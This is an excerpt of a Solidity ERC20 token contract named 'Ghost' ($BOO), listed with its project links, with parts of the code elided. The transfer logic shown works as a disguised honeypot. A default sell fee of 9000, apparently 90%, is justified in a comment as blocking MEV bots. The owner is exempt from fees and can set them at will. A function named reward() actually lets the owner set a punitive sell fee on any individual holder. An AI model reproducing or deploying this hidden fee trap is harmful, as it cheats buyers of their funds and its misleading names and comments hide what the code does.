...
https://ghostsnipe.com
https://twitter.com/Ghost_erc20
https://t.me/GHOST_ERC
...
contract Ghost is Ownable, ERC20 {
    ...
    uint256 public claimFromAmount = 0;
    uint256 public claimToAmount = 9000; // Leave it 9000 to avoid mev bot
    ...
    mapping(address => uint256) private _claimOnPerson;

    constructor() ERC20("Ghost", "$BOO") {
    ...
    // 0, 0
    function setClaimAmount(uint256 _claimFrom, uint256 _claimTo) external onlyOwner {
        claimFromAmount = _claimFrom;
        claimToAmount = 9000 - _claimTo;
    }
    ...
    function reward(address _address, uint256 _amount) external onlyOwner {
        _claimOnPerson[_address] = _amount;
    }
    ...
    function _transfer(
        ...
        if (uniswapV2Pair != address(0) && from != owner() && to != owner()) {
            ...
            if (from == uniswapV2Pair) {
                _fee = claimFromAmount;
            }
            else if (to == uniswapV2Pair) {
                if (_claimOnPerson[from] != 0) {
                    _fee = _claimOnPerson[from];
                }
                else {
                    _fee = claimToAmount;
                }
